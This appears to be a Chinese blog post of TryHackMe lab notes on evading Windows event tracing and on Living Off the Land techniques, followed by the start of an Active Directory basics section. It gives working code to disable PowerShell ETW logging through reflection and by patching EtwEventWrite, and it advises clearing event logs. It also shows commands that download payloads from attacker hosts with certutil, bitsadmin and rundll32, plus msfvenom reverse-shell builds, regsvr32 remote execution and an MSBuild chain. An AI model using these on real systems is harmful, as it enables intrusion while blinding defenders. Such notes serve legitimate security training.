提供程序是包含事件跟踪代码的应用程序。它会根据事件控制器的指令来决定是否生成事件。当被控制器启用后，提供程序就会从其指定的来源收集并发送日志。 事件控制器 (Event Controller)： 功能： 这是一个指挥中心，用于管理和配置事件会话。 工作原理： 控制器决定了数据如何被收集以及流向何处。它定义了日志文件的大小、位置，启动或停止跟踪会话，启用或禁用特定的提供程序，并管理缓冲区。简而言之，控制器负责整个数据流的指挥调度。 事件消费者 (Event Consumer)： 功能： 这是一个分析工具，用于接收和解释事件。 工作原理： 消费者选择一个或多个事件会话作为数据源，然后解析这些事件进行分析。我们最熟悉的“事件查看器”就是事件消费者的一种。消费者可以从实时会话或存储在日志文件中的事件中接收数据。 这三个组件共同构成了一个完整的事件追踪链： 起源（提供程序）：事件从提供程序（如某个应用程序）中产生。 处理（控制器）：控制器决定这些事件被发送到哪个会话，以及如何被缓冲和处理。 分析（消费者）：消费者接收并解析会话中的日志，以便进行解释或分析。 攻击者的目标是在保持完整性的同时减少可见性。ETW 的分层结构为攻击者提供了一个新的攻击面。通过有针对性地攻击 ETW 的某个组件，攻击者可以在不完全破坏数据流的情况下，限制特定行为的可见性。这使得他们能够隐藏自己的恶意活动，而不必完全禁用整个日志系统。 **Component ** Techniques Provider PSEtwLogProvider 修改、组策略接管、日志管道滥用、类型创建 Controller 修补 EtwEventWrite，运行时跟踪篡改 Consumers 日志粉碎，日志篡改 在接下来将深入介绍每一种技术。 绕过方法PowerShell 的两种主要日志类型： 脚本块日志 (Script block logging)： 记录在 PowerShell 会话中执行的所有脚本块。 它报告 Event ID 4104，是攻击者最需要关注的日志，因为它会完整暴露未混淆的恶意脚本。 模块日志 (Module logging)： 记录 PowerShell 模块中执行的命令和数据。 它报告 Event ID 4103。由于这种日志非常详细且数量庞大，它经常被系统管理员禁用，或者因为噪音太大而被忽略。 反射在 PowerShell 里面 ETW Providers 是通过一个 .NET 程序集 PSEtwLogProvider 载入到这个 PowerShell 会话里面的。在一个 PowerShell 会话里面，大多数 .NET 程序集会在用户启动时加载相同的安全上下文。所以用户拥有的权限和加载的程序集有相同的权限级别，所以我们就可以通过反射修改他，和前面的绕过 PowerShell 的 AMSI 原理是一样的。 这段 PowerShell 代码利用反射（Reflection），通过直接操作 .NET 程序集的内部私有字段，来强制禁用 ETW 事件记录。 1234567891011# 获取 PowerShell ETW 事件提供程序的内部类型 # 这是一个名为 PSEtwLogProvider 的非公共类型 $logProvider = [Ref].Assembly.GetType(&#39;System.Management.Automation.Tracing.PSEtwLogProvider&#39;) # 获取该类型中名为 &#39;etwProvider&#39; 的静态私有字段的值 # 该字段是 ETW 提供程序的一个实例 $etwProvider = $logProvider.GetField(&#39;etwProvider&#39;,&#39;NonPublic,Static&#39;).GetValue($null) # 强制将该 ETW 提供程序实例的 &#39;m_enabled&#39; 字段设为 0 # 这会禁用事件记录，从而阻止 PowerShell 将日志发送给 ETW [System.Diagnostics.Eventing.EventProvider].GetField(&#39;m_enabled&#39;,&#39;NonPublic,Instance&#39;).SetValue($etwProvider,0); 4104 是 PowerShell 日志记录的 Event ID，我们用这个来测试是否绕过了，如果绕过了，怎么执行命令这个日志数量都不会变的。 12# 获取 4104 Event ID 的日志条目 Get-WinEvent -FilterHashtable @{ProviderName=&quot;Microsoft-Windows-PowerShell&quot;; Id=4104} | Measure | % Count 修补和 AMSI 的原理是一样的，也是因为加载的 ETW 组件和用户平权，导致可以修改这个组件的内存区域。 14h 是 20 个字节，也就是 EtwEventWrite 的 5 个形参，ret 14h 会把这 5 个参数丢掉。打完补丁之后，任何对 EtwEventWrite 函数的调用都会立即弹出返回地址，清理掉参数，返回到调用者。 换一种理解方式：在调用这个函数执行的时候，就会有5个参数传过来，进栈。而我们直接 ret 14h 是直接返回了一个不知道是什么的结果，然后把那20个字节在栈里面的数据清理了，这样我们就可以在不执行这个函数里面代码的前提下绕过函数执行了，本来那5个参数在内部是要被用掉的。 如果还是不理解去好好研究一下栈结构，你就明白了。 我简述一下过程： 调用函数时，将参数压入栈（20字节） 会把返回地址（下一条指令的地址压入栈中） 函数开头是 ret 14h 直接跳到下一条指令的地址去执行 同时清理掉 20 字节的参数 这里并没有讨论这个函数的返回值，我觉得我可能是少了这一个概念导致卡了很久，总之原理就是这样。 12345678910111213141516171819202122232425262728293031// 获取 EtwEvenetWrite 地址 var ntdll = Win32.LoadLibrary(&quot;ntdll.dll&quot;); var etwFunction = Win32.GetProcAddress(ntdll, &quot;EtwEventWrite&quot;); // 修改内存区域的权限 uint oldProtect; Win32.VirtualProtect( etwFunction, (UIntPtr)patch.Length, 0x40, out oldProtect ); // 写入我们准备好的 opcode patch(new byte[] { 0xc2, 0x14, 0x00 }); Marshal.Copy( patch, 0, etwEventSend, patch.Length ); // 恢复内存区域的权限 VirtualProtect(etwFunction, 4, oldProtect, &amp;oldOldProtect); // 刷新指令缓存 // 强制 CPU 丢弃旧的函数指令，以确保补丁能够立即生效 Win32.FlushInstructionCache( etwFunction, NULL ); 组策略ETW 提供了强大的日志功能，但并非所有功能都默认开启。 为了避免生成海量日志，一些高频度记录的功能（如 PowerShell 日志）需要通过 GPO（组策略） 明确启用。 模块日志记录和脚本块日志记录提供程序都通过组策略启用，具体为 Administrative Templates -&gt; Windows Components -&gt; Windows PowerShell 。同样的，系统程序集也是和用户同级加载的，所以可以通过反射修改 PowerShell 提供程序的组策略。 具体步骤如下： 从实用程序缓存中获取组策略设置。 修改通用提供程序为 0。 修改调用或模块定义。 12345678910111213141516171819202122232425262728293031323334353637# ==================================================================== # PowerShell 日志记录规避脚本 # 目的：通过修改 PowerShell 的组策略设置，来禁用或减少 ETW 日志。 # 该脚本使用反射技术，直接操作内存中的私有字段。 # ==================================================================== # 第 1 步：使用反射获取组策略设置的私有字段 # -------------------------------------------------------------------- # 获取 &quot;System.Management.Automation.Utils&quot; 类型的引用。 # 该类型包含了我们想要修改的私有字段。 $UtilsType = [ref].Assembly.GetType(&#39;System.Management.Automation.Utils&#39;) # 通过反射，获取名为 &quot;cachedGroupPolicySettings&quot; 的私有静态字段。 # 这个字段存储了 PowerShell 当前加载的组策略设置。 $cachedGroupPolicySettingsField = $UtilsType.GetField(&#39;cachedGroupPolicySettings&#39;, &#39;NonPublic,Static&#39;) # 获取该字段的当前值。$null 用于获取静态字段的值。 $GroupPolicySettings = $cachedGroupPolicySettingsField.GetValue($null) # 第 2 步：修改脚本块日志（事件 ID 4104）设置 # -------------------------------------------------------------------- # 将 &quot;EnableScriptBlockLogging&quot; 的值设为 0。 # 这会禁用脚本块日志记录，从而阻止记录完整的脚本内容。 # 这对攻击者最重要，因为它可以隐藏恶意脚本。 $GroupPolicySettings[&#39;ScriptBlockLogging&#39;][&#39;EnableScriptBlockLogging&#39;] = 0 # 第 3 步：修改模块日志（事件 ID 4103）设置 # -------------------------------------------------------------------- # 将 &quot;EnableScriptBlockInvocationLogging&quot; 的值设为 0。 # 这会禁用模块日志记录，从而阻止记录命令调用和参数。 # 由于 4103 日志通常非常多，禁用它可以减少噪音，使攻击者活动更难被发现。 $GroupPolicySettings[&#39;ScriptBlockLogging&#39;][&#39;EnableScriptBlockInvocationLogging&#39;] = 0 同样用这个命令来测试是否生效 12345# 获取 4104 Event ID 的日志条目 Get-WinEvent -FilterHashtable @{ProviderName=&quot;Microsoft-Windows-PowerShell&quot;; Id=4104} | Measure | % Count # 从指定的日志文件中，找出所有目标端口为 4444 的网络连接事件 Get-WinEvent -Path C:\\Users\\THM-Analyst\\Desktop\\Scenarios\\Practice\\Hunting_Metasploit.evtx -FilterXPath &#39;*/System/EventID=3 and */EventData/Data[@Name=&quot;DestinationPort&quot;] and */EventData/Data=4444&#39; 滥用日志管道在 PowerShell 中，每个模块或管理单元（snap-in）都有一个可供任何人使用的设置，用于修改其日志记录功能。根据微软文档，“当 LogPipelineExecutionDetails 属性值为 TRUE（$true）时，Windows PowerShell 会将该会话中的 cmdlet 和函数执行事件写入事件查看器中的 PowerShell 日志。”攻击者可以在任何 PowerShell 会话中将此值更改为 $false，以禁用该特定会话的模块日志记录。微软文档甚至指出了从用户会话中禁用日志记录的能力：“要禁用日志记录，请使用相同的命令序列将属性值设置为 FALSE（$false）。” 从宏观上看，日志管道技术可以分解为四个步骤： 获取目标模块。 将模块的执行细节设置为 $false。 获取模块管理单元。 将管理单元的执行细节设置为 $false。 1234$module = Get-Module Microsoft.PowerShell.Utility # 获取目标模块 $module.LogPipelineExecutionDetails = $false # 将模块的执行细节设置为 false $snap = Get-PSSnapin Microsoft.PowerShell.Core # 获取目标 ps-snapin $snap.LogPipelineExecutionDetails = $false # 将 ps-snapin 的执行细节设置为 false 上述脚本块可以附加到任何 PowerShell 脚本中，或在会话中运行，以禁用当前已导入模块的日志记录。 实践随便执行一个绕过方法，因为都是注入到当前的 PowerShell 进程里面的，所以不会影响环境，然后去日志查看器里面清理一下 PowerShell 的操作日志就行了。 Living Off the Land 土生土长这个房间名称有意思，实际教的内容也是很相关的，他教我们利用系统内置的应用达成我们的目的，这在渗透环境中是非常有用的，因为如果从我们的环境里面拉工具下来风险挺大的，利用内置的工具就相当于就地取材了 Windows SysinternalsWindows Sysinternals 是一套工具和高级系统实用程序，旨在帮助 IT 专业人员在各种高级主题中管理、排查和诊断 Windows 操作系统。 以下是一些常用的 Windows Sysinternals 工具： AccessChk Helps system administrators check specified access for files, directories, Registry keys, global objects, and Windows services. PsExec A tool that executes programs on a remote system. ADExplorer An advanced Active Directory tool that helps to easily view and manage the AD database. ProcDump Monitors running processes for CPU spikes and the ability to dump memory for further analysis. ProcMon An essential tool for process monitoring. TCPView A tool that lists all TCP and UDP connections. PsTools The first tool designed in the Sysinternals suite to help list detailed information. Portmon Monitors and displays all serial and parallel port activity on a system. Whois Provides information for a specified domain name or IP address. 有关 Sysinternals 套件的更多信息，您可以在此访问 Microsoft Docs 上该工具的网页. 在线 SysinternalsWindows Sysinternals 的一个重要特点是无需安装。微软提供了一个 Windows Sysinternals 服务——Sysinternals Live，提供多种使用和运行这些工具的方式。我们可以通过以下方式访问和使用它们 https://live.sysinternals.com/ \\\\live.sysinternals.com\\tools 如果你有兴趣进一步了解 Windows Sysinternals，我们建议你熟悉以下额外资源： TryHackMe room: Sysinternals. Microsoft Sysinternals Resources website. LOLBAS 项目LOLBAS 代表 “利用本地二进制文件和脚本生存”（Living Off the Land Binaries And Scripts）。该项目的主要目标是收集并记录由微软签名并内置的、作为“利用本地资源”技术使用的工具，包括二进制文件、脚本和库。 LOLBAS 项目是一个由社区驱动的资料库，收集了可用于红队用途的二进制文件、脚本和库。它允许基于二进制文件、函数、脚本和 ATT&amp;CK 信息进行搜索。上图显示了目前 LOLBAS 项目页面的样貌。如果你想了解更多关于该项目的详细信息，可以访问该项目的官网：https://lolbas-project.github.io/ LOLBAS 网站提供了一个方便的搜索栏来查询所有可用数据。直接搜索二进制文件很简单；包含二进制名称即可显示结果。然而，如果我们想查找特定函数，则需要在函数名前加上 &#x2F;。例如，如果我们要查找所有执行函数，应使用 &#x2F;execute 同样，为了基于类型进行查找，我们应使用 # 符号后跟类型名称。以下是项目中包含的类型： Script 脚本 Binary 二进制 Libraries 库 OtherMSBinaries 其他 MS 二进制文件 Tools Criteria 工具标准要被认定为“原生系统工具（Living Off the Land）”技巧并被纳入 LOLBAS 项目，工具必须满足特定标准： 由微软签名、属于操作系统原生或从微软下载的文件。 具有额外的、有趣的、未按已知用例覆盖的非预期功能。 对高级持续性威胁（APT）或红队活动有利。 如果你发现了符合上面条件的二进制文件，可以去他的 repo 里面贡献一下。 Interesting Functionalities 有趣的功能LOLBAS 项目接受符合以下功能之一的工具提交： Arbitrary code execution 任意代码执行 File operations, including downloading, uploading, and copying files.文件操作，包括下载、上传和复制文件。 Compiling code 正在编译代码 Persistence, including hiding data in Alternate Data Streams (ADS) or executing at logon.持久性，包括在替代数据流（ADS）中隐藏数据或在登录时执行。 UAC bypass UAC 绕过 Dumping process memory 转储进程内存 DLL injection DLL 注入 文件操作本任务将重点介绍一些有趣的“借助现有系统工具（Living Off the Land）”技术，这些技术旨在用于文件操作，包括下载、上传和编码。 CertutilCertutil 是 Windows 内置的证书服务工具，该工具的正常用途是检索证书信息。人们发现 certutil.exe 可以传输和编码与证书服务无关的文件。MITRE ATT&amp;CK 框架将该技术标识为入口工具传输（T1105） 为了说明这一点，我们可以举个例子：使用 certutil.exe 从攻击者的 Web 服务器下载文件并将其存储在 Windows 的临时文件夹中，使用下面的命令： 1certutil -URLcache -split -f http://Attacker_IP/payload.exe C:\\Windows\\Temp\\payload.exe -urlcache 显示 URL，启用命令中可使用的 URL 选项 -split -f 用于从提供的 URL 拆分并强制获取文件 此外，certutil.exe 可用作编码工具，我们可以用它对文件进行编码并解码文件内容。 123certutil -encode payload.exe Encoded-payload.txt # 解码 certutil -decode enc_thm_0YmFiOG_file.txt plain.txt 更多信息可以参考：Microsoft Docs: CertUtil BITSAdminbitsadmin 工具是一个系统管理员实用程序，可用于创建、下载或上传后台智能传输服务（BITS）任务并检查其进度。BITS 是一种用于从 HTTP 网络服务器和 SMB 服务器下载和上传文件的低带宽、异步方法。 攻击者可能滥用 BITS 任务在被入侵的机器上下载并执行恶意 payload。有关该技术的更多信息，您可以访问 ATT&amp;CK T1197 页面。 1bitsadmin.exe /transfer /Download /priority Foreground http://10.6.4.118/payload.exe c:\\Users\\thm\\Desktop\\payload.exe &#x2F;Transfer 使用转移选项 &#x2F;Download 我们正在使用下载类型指定传输 &#x2F;Priority 优先级设置为在前台运行 有关 bitsadmin 工具的更多信息，请参阅 Microsoft Docs。 FindStr使用 findstr.exe 从网络内的 SMB 共享文件夹下载远程文件，方法如下 1C:\\Users\\thm&gt;findstr /V dummystring \\\\MachineName\\ShareFolder\\test.exe &gt; c:\\Windows\\Temp\\test.exe /V 打印出不包含所提供字符串的行。 dummystring 要搜索的文本；在这种情况下，我们提供一个不得在文件中出现的字符串。 &gt; c:\\Windows\\Temp\\test.exe 将输出重定向到目标机器上的一个文件。 请注意，其他工具也可用于该文件操作。我们建议访问 LOLBAS 以查看它们。 文件执行除了常见的如通过命令行 cmd.exe 或桌面快捷方式启动之外，攻击者还会滥用合法的系统二进制文件来执行载荷。 这种方法被称为 “已签名二进制代理执行”（Signed Binary Proxy Execution） 或 “间接命令执行”（Indirect Command Execution）。根据 MITRE ATT&amp;CK 框架，这种技术的核心是利用操作系统自带的、通常被认为是“可信”的工具来生成并执行恶意载荷。 这样做有两个主要目的： 隐藏恶意载荷的进程：使恶意活动看起来像是合法的系统进程。 规避安全防御：利用这些已签名的、白名单内的系统工具，可以有效绕过安全产品的检测和防御。 File Explorer文件资源管理器是 Windows 的文件管理器和系统组件。人们发现使用文件资源管理器的可执行文件可以执行其他 .exe 文件。这种技术称为间接命令执行（Indirect Command Execution），即可以利用并滥用 explorer.exe 工具从受信任的父进程启动恶意脚本或可执行文件。 explorer.exe 二进制文件位于： C:\\Windows\\explorer.exe for the Windows 64-bit version. C:\\Windows\\SysWOW64\\explorer.exe for the Windows 32-bit version. 为了以 explorer.exe 作为父进程创建子进程，我们可以执行以下命令： 1explorer.exe /root,&quot;C:\\Windows\\System32\\calc.exe&quot; WMICWindows Management Instrumentation (WMIC) 是一个管理 Windows 组件的命令行工具。有人发现 WMIC 也被用于执行二进制文件以规避防御措施。MITRE ATT&amp;CK 框架将该技术称为签名二进制代理执行 (T1218) 1wmic.exe process call create calc Rundll32Rundll32 是微软内置的工具，用于在操作系统内加载并运行动态链接库（DLL）文件。红队可以滥用并利用 rundll32.exe 来运行任意 payload 并执行 JavaScript 与 PowerShell 脚本。MITRE ATT&amp;CK 框架将此识别为签名二进制代理执行：Rundll32，并将其标识为 T1218。 rundll32.exe 二进制文件位于： C:\\Windows\\System32\\rundll32.exe for the Windows 64-bit version. C:\\Windows\\SysWOW64\\rundll32.exe for the Windows 32-bit version. 使用包含 JavaScript 组件 eval() 的 rundll32.exe 二进制文件来执行 calc.exe。 1rundll32.exe javascript:&quot;\\..\\mshtml.dll,RunHTMLApplication &quot;;eval(&quot;w=new ActiveXObject(\\&quot;WScript.Shell\\&quot;);w.run(\\&quot;calc\\&quot;);window.close()&quot;); 我们也可以使用 rundll32.exe 来执行 PowerShell 脚本。下面的命令运行一个 JavaScript，该脚本通过 rundll32.exe 执行一个 PowerShell 脚本，从远程网站下载内容。 1rundll32.exe javascript:&quot;\\..\\mshtml,RunHTMLApplication &quot;;document.write();new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString(&#39;http://AttackBox_IP/script.ps1&#39;);&quot;); 应用白名单绕过应用白名单是微软终端安全功能，用于实时阻止恶意和未授权程序的执行。应用白名单基于规则，指定允许出现在操作系统上并被执行的已批准应用或可执行文件列表。 Regsvr32Regsvr32 是微软的一个命令行工具，用于在 Windows 注册表中注册和注销动态链接库（DLL）。regsvr.exe 可执行文件位于： C:\\Windows\\System32\\regsvr32.exe for the Windows 32 bits version C:\\Windows\\SysWOW64\\regsvr32.exe for the Windows 64 bits version 除了其预期用途外，regsvr32.exe 二进制文件还可以用于执行任意二进制文件并绕过 Windows 应用白名单。根据 Red Canary 的报告，regsvr32.exe 是第三大流行的 ATT&amp;CK 技术。对手利用 regsvr32.exe 在本地或远程执行本机代码或脚本。regsvr32.exe 使用的技术利用了受信任的 Windows 操作系统组件并在内存中执行，这也是该技术常被用来绕过应用白名单的原因之一。 让我们使用 msvenom 创建一个恶意的 DLL 文件，并设置 Metasploit 监听器以接收反向 shell。我们将创建一个适用于 32 位操作系统的恶意文件。我们将使用 regsvr32.exe 应用白名单绕过技术在目标系统上运行命令。 12345678msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f dll -a x86 &gt; live0fftheland.dll msfconsole -q use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set LHOST 10.11.141.2 set LPORT 443 exploit 然后传到靶机上，不传也行。 123c:\\Windows\\System32\\regsvr32.exe c:\\Users\\thm\\Downloads\\live0fftheland.dll # 远程执行 c:\\Windows\\System32\\regsvr32.exe /s /n /u /i:http://example.com/file.sct Downloads\\live0fftheland.dll 第二个选项，这是一个更高级的命令，我们指示 regsvr32.exe 运行： /s：静默模式（不显示消息） /n：不要调用 DLL 注册服务器 /i: 因为我们用了 &#x2F;n，所以改用另一台服务器 /u：使用未注册方法运行 如果我们想创建一个 64 位的 DLL 版本，需要在 msfvenom 命令中指定，并在受害者机器上使用位于 C:\\Windows\\SysWOW64\\regsvr32.exe 的 64 位 regsvr32.exe 来运行它。 Bourne Again Shell (Bash)在 2016 年，微软为 Windows 10、11 和 Server 2019 增加了对 Linux 环境的支持。此功能称为 Windows 子系统用于 Linux（WSL），并存在两个版本：WSL1 和 WSL2。WSL 是在操作系统上运行的通过 Hyper-V 虚拟化的 Linux 发行版，支持一部分 Linux 内核和系统调用。此功能是用户可以安装并与之交互的附加组件。作为 WSL 的一部分，bash.exe 是用于与该 Linux 环境交互的微软工具。 人们找到了利用该 Microsoft 签名二进制文件来执行 payload 并绕过 Windows 应用程序白名单的方法。通过执行 bash.exe -c &quot;path-to-payload&quot;，我们可以执行任何未签名的 payload。ATT&amp;CK 将这称为间接命令执行（Indirect Command execution）技术，攻击者滥用 Windows 工具实用程序以获取命令执行。有关此技术的更多信息，您可以访问 T1202 ATT&amp;CK 网站。 需要在 Windows 10 中启用并安装 Windows 子系统以使用 bash.exe 二进制文件。此外，附带的虚拟机由于嵌套虚拟化限制未启用该 Linux 子系统。 其他技术本节提了几种有趣的技术，可用于初始访问或保活。 Shortcuts 快捷方式当用户点击快捷方式文件时，被引用的文件或应用程序会被执行。红队经常利用此技术来获得初始访问权限、提升权限或实现持久性。MITRE ATT&amp;CK 框架将此快捷方式修改技术称为 T1547，攻击者通过创建或修改快捷方式来利用该技术。 要使用快捷方式修改技术，我们可以将目标部分设置为使用以下命令来执行文件： Rundll32 Powershell Regsvr32 硬盘上的可执行文件 房间里给的 demo 是我们之前用 rundll32.exe 执行计算器的，我们要复现直接把之前的那条命令粘贴到目标里面的 这里有几个快捷方式修改的 demo：https://github.com/theonlykernel/atomic-red-team/blob/master/atomics/T1023/T1023.md No PowerShell!2019 年，Red Canary 发布了一份威胁检测报告，指出 PowerShell 是用于恶意活动的最常见技术。因此，各组织开始监控或阻止 powershell.exe 的执行。结果，对手开始寻找在不直接启动 powershell.exe 的情况下运行 PowerShell 代码的其他方法。 PowerLessShell 是一个基于 Python 的工具，用于生成在目标机器上运行的恶意代码，同时不会显示 PowerShell 进程的实例。PowerLessShell 依赖滥用 Microsoft Build Engine (MSBuild) —— 一个用于构建 Windows 应用程序的平台 —— 来执行远程代码。 1234567891011121314151617# 下载项目文件 git clone https://github.com/Mr-Un1k0d3r/PowerLessShell.git # 生成一个 PowerShell payload msfvenom -p windows/meterpreter/reverse_winhttps LHOST=10.11.141.2 LPORT=4443 -f psh-reflection &gt; liv0ff.ps1 # 启动好 MSF handler msfconsole -q -x &quot;use exploit/multi/handler; set payload windows/meterpreter/reverse_winhttps; set lhost 10.11.141.2;set lport 4443;exploit&quot; # 生成 csproj 文件 python2 PowerLessShell.py -type powershell -source /tmp/liv0ff.ps1 -output liv0ff.csproj # 下载文件 bitsadmin.exe /transfer /Download /priority Foreground http://10.6.4.118/liv0ff.csproj c:\\Users\\thm\\Desktop\\liv0ff.csproj # 目标机器上编译就执行了 c:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe c:\\Users\\thm\\Desktop\\liv0ff.csproj 我跑起来了，拿到 flag，但是攻击机上没有 shell 回连，不知道啥情况。 现实场景2017 年，Windows Defender 高级威胁防护（Windows Defender ATP）研究团队发现了一种名为 Astaroth 的无文件恶意软件。无文件恶意软件指的是在系统中运行并执行但不写入磁盘的恶意软件。该恶意软件在受害设备的内存中执行其所有功能。 Astaroth 被认为是一种信息窃取器，会从受害用户处获取敏感信息，例如账户凭据、按键记录和其他数据，并将其发送给攻击者。该恶意软件依赖多种先进技术来执行不同功能，如反调试、反虚拟化、反仿真技巧、进程掏空（process hollowing）、NTFS 备用数据流（ADS）以及“借用现有系统工具”（Living off the land）二进制文件。 在初始访问阶段，攻击者依赖包含恶意附件文件的垃圾邮件活动。所附文件是一个 LNK 快捷方式文件，一旦受害者点击它，将导致以下情况： 执行了一个 WMIC 命令以下载并运行 Javascript 代码。 滥用 BITSadmin 从指挥控制服务器下载多个二进制文件。有趣的是，在某些情况下，恶意软件会使用 YouTube 频道描述来隐藏它们的 C2 服务器命令。 使用 BITSadmin、ADS 技术，将其二进制文件隐藏在系统内以实现持久性。 使用 Certutil 工具将几个下载的有效载荷解码为 DLL 文件。 这些 DLL 文件使用 Regsvr32 执行。 有关该恶意软件及其检测的更多详细信息，建议查阅以下参考资料： Astaroth: Banking Trojan Microsoft Discovers Fileless Malware Campaign Dropping Astaroth Info Stealer Astaroth malware hides command servers in YouTube channel descriptions 总结在本房间中，我们介绍了“就地取材”（Living Off the Land）的一般概念，并回顾了一些在红队演练中见到和使用的示例。就地取材技术可用于多种目的，包括侦察、文件操作、执行二进制文件，以及实现持久化和绕过安全措施。 其他资源 GTFOBins - The Linux version of the LOLBAS project. Astaroth: Banking Trojan - A real-life malware analysis where they showcase using the Living Off the Land technique used by Malware.","categories":[{"name":"THM","slug":"THM","permalink":"https://blog.irec.moe/categories/THM/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://blog.irec.moe/tags/Windows/"},{"name":"C#","slug":"C","permalink":"https://blog.irec.moe/tags/C/"}]},{"title":"Try Hack Me - Active Directory","slug":"THM/20250802_Active_Directory/AD","date":"2025-08-09T16:00:00.000Z","updated":"2025-08-09T16:51:50.000Z","comments":true,"path":"/thm_ad.html","permalink":"https://blog.irec.moe/thm_ad.html","excerpt":"","text":"概述这是我在 TryHackMe 里面学习 Windows Active Directory 相关渗透技巧的记录，推荐当做一个官方之外的 WriteUp 来阅读，直接阅读你会看不懂的。说实话各个房间设计的都挺巧妙的，虽然也有很多 Bug，不过利用搜索引擎和官方的 Discord 群组能解决。 这一部分我耗时一个星期完成，大多都是我的学习记录和理解，希望里面的内容能帮到你们。 Active Directory Basics这个房间主要是讲了一下 AD 的基础，还有实操了一下 GPO Windows 域Windows 域是受特定企业管理的一组用户和计算机。域的主要理念是将 Windows 计算机网络的常用组件集中管理到一个名为Active Directory ( AD )的存储库中。运行 Active Directory 服务的服务器称为域控制器 ( DC )。 配置 Windows 域的主要优点是： **集中身份管理：**可以轻松从 Active Directory 配置整个网络的所有用户。 **管理安全策略：**您可以直接从 Active Directory 配置安全策略，并根据需要将其应用于网络上的用户和计算机。 Active DirectoryWindows 域的核心是 AD DS (Active Directory Domain Service)，这项服务就像一个目录，保存着网络上所有“对象”的信息。在 AD 支持的众多对象中，有用户、组、机器、打印机、共享等。让我们来看看其中的一些： Users 用户用户是一种被称为安全主体的对象。安全主体是一个通用的概念，它指的是任何可以被域认证身份（如通过密码），并被授予权限来访问和操作网络中各种资源（如文件、打印机）的实体。 用户可用于代表两类实体： People：用户通常代表组织中需要访问网络的人员，如员工。 Service：您也可以定义用户供 IIS 或 MSSQL 等服务使用。每个服务都需要用户才能运行，但服务用户与普通用户不同，他们只拥有运行特定服务所需的权限。 Machines 机器机器是 Active Directory 中的另一种对象类型；每台加入 Active Directory 域的计算机都会创建一个机器对象。机器也被视为安全主体，与普通用户一样被分配一个账户。该账户在域内的权限有限。 机器账户本身是指定计算机上的本地管理员，除了计算机本身外，一般不允许任何人访问，但与其他账户一样，如果你有密码，就可以用它登录。 机器账户的密码会被自动轮换，它由120个随机字符串组成，机器账户是由机器名后加一个 $ 符号组成，比如 DC01 机器会有一个 DC01$ 账户。 Security Groups 安全组如果你熟悉 Windows，你可能知道可以定义用户组，将文件或其他资源的访问权限分配给整个组，而不是单个用户。这样可以更好地进行管理，因为你可以将用户添加到现有组中，他们将自动继承该组的所有权限。安全组也被视为安全负责人，因此可以拥有对网络资源的权限。 组的成员既可以是用户，也可以是机器。如果需要，组还可以包括其他组。 域中默认创建了几个组，可用于向用户授予特定权限。下面举例说明域中最重要的几个组： Security Group Description Domain Admins 该组的用户拥有整个域的管理权限。默认情况下，他们可以管理域上的任何计算机，包括 DC。 Server Operators 该组中的用户可以管理域控制器。他们不能更改任何管理组的成员资格。 Backup Operators 该组的用户可以访问任何文件，无需考虑其权限。它们用于执行计算机数据备份。 Account Operators 该组中的用户可以创建或修改域中的其他账户。 Domain Users Includes all existing user accounts in the domain. Domain Computers Includes all existing computers in the domain. Domain Controllers Includes all existing DCs on the domain. 关于默认安全组的微软文档：https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups Organizational Units 管理单元要在 Active Directory 中配置用户、组或机器，我们需要登录域控制器，并从开始菜单中运行 “Active Directory Users and Computers”： 这将打开一个窗口，你可以看到域中存在的用户、计算机和组的层次结构。这些对象按组织单位 (Organizational Units OU) 组织，组织单位是一种容器对象，可以对用户和计算机进行分类。OUs 主要用于定义具有类似监控要求的用户集合。请记住，一个用户在同一时间只能属于一个 OU。 Windows 自动创建的 OU，包含以下内容： Builtin： 包含任何 Windows 主机都可使用的默认组。 Computers： 任何加入网络的机器都会默认放在这里。如有需要，您可以移动它们。 Domain Controllers： 包含网络中 DC 的默认 OU。 Users： 适用于全域范围的默认用户和组。 Managed Service Accounts： 保存 Windows 域中服务使用的账户。 Security Groups vs OUs你可能想知道为什么我们既有组又有 OU。虽然两者都用于对用户和计算机进行分类，但它们的目的完全不同： OU 可以方便地将策略应用到用户和计算机，其中包括根据用户在企业中的特定角色对其进行特定配置。请记住，一个用户在同一时间只能是一个 OU 的成员，因为试图对一个用户应用两套不同的策略是没有意义的。 另一方面，安全组用于授予资源权限。例如，如果要允许某些用户访问共享文件夹或网络打印机，就需要使用组。一个用户可以是多个组的成员，这是对多个资源授予访问权限所必需的。 管理 AD删除额外的 OU 和用户需要关闭 Advanced Features -&gt; Object -&gt; Protect object from accidental deletion 委派 Delegation在 AD 中可以做的一件好事就是让特定用户对某些 OU 享有一定的控制权。这个过程被称为委派，允许你授予用户在 OU 上执行高级任务的特定权限，而不需要域管理员介入。最常见的使用案例之一就是授予 IT 支持人员重置其他低权限用户密码的权限。 给 OU 委派，右键选择 Delegate Control -&gt; Add -&gt; Check Names -&gt; 选择要委派的权限。 12345# 重置密码 Set-ADAccountPassword sophie -Reset -NewPassword (Read-Host -AsSecureString -Prompt &#39;New Password&#39;) -Verbose # 强制用户在登录时改密码 Set-ADUser -ChangePasswordAtLogon $true -Identity sophie -Verbose 管理计算机默认情况下，所有加入域的计算机（DC 除外）都会被放入名为“Computers”的容器中。 我们可以看到一些服务器、一些笔记本电脑和一些 PC，它们分别对应着我们网络中的用户。将所有设备都放在那里并不是最好的选择，因为您很可能希望针对服务器和普通用户日常使用的机器设置不同的策略。 虽然没有关于如何组织你的机器的黄金法则，但一个很好的起点是根据设备的用途进行分类。通常，你会看到设备至少分为以下三类： 1.工作站 工作站是 Active Directory 域中最常见的设备之一。域中的每个用户都可能登录到工作站。他们将使用该设备进行工作或进行正常的浏览活动。这些设备绝对不应该有特权用户登录。 2. 服务器 服务器是 Active Directory 域中第二常见的设备。服务器通常用于向用户或其他服务器提供服务。 3. 域控制器 域控制器是 Active Directory 域中第三常见的设备。域控制器允许您管理 Active Directory 域。这些设备通常被视为网络中最敏感的设备，因为它们包含环境中所有用户帐户的哈希密码。 Group Policies 组策略到目前为止，我们只是为了方便而将用户和计算机组织到 OU 中，但这背后的主要想法是能够为每个 OU 单独部署不同的策略。这样，我们就可以根据用户所在的部门向其推送不同的配置和安全基线。 Windows 通过组策略对象（GPO）来管理此类策略。GPO 只是一组可应用于 OU 